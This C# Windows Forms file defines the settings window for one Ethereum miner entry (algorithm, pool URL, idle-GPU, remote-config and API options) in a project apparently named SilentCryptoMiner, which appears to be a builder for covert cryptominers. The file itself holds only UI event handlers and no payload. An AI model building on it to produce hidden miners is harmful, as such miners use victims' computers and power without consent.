using System;
using System.Drawing;
using System.Windows.Forms;

namespace SilentCryptoMiner
{
    public partial class MinerETH
    {
        public MinerETH()
        {
            InitializeComponent();
        }

        public Builder F = (Builder)Application.OpenForms["Builder"]; 
        public int nid = 0;

        private void Form1_Load(object sender, EventArgs e)
        {
            Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            formMinerETH.SubHeader = nid + " - " + comboAlgorithm.Text;
            F.ReloadMinerList();
            if (string.IsNullOrEmpty(txtAdvParam.Text))
            {
                txtAdvParam.Text = F.advancedParamsETH;
            }
        }

        private void MinerETH_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            F.ReloadMinerList();
            Hide();
        }

        public override string ToString()
        {
            return $"{nid}: {comboAlgorithm.Text} - {txtPoolURL.Text}";
        }

        private void toggleIdle_CheckedChanged(object sender)
        {
            txtIdleGPU.Enabled = toggleIdle.Checked;
            txtIdleWait.Enabled = toggleIdle.Checked;
        }

        private void chkRemoteConfig_CheckedChanged(object sender)
        {
            txtRemoteConfig.Enabled = chkRemoteConfig.Checked;
        }

        private void chkAdvParam_CheckedChanged(object sender)
        {
            txtAdvParam.Enabled = chkAdvParam.Checked;
        }

        private void chkAPI_CheckedChanged(object sender)
        {
            txtAPI.Enabled = chkAPI.Checked;
        }

        private void comboAlgorithm_SelectedIndexChanged(object sender, EventArgs e)
        {
            formMinerETH.SubHeader = nid + " - " + comboAlgorithm.Text;
        }
    }
}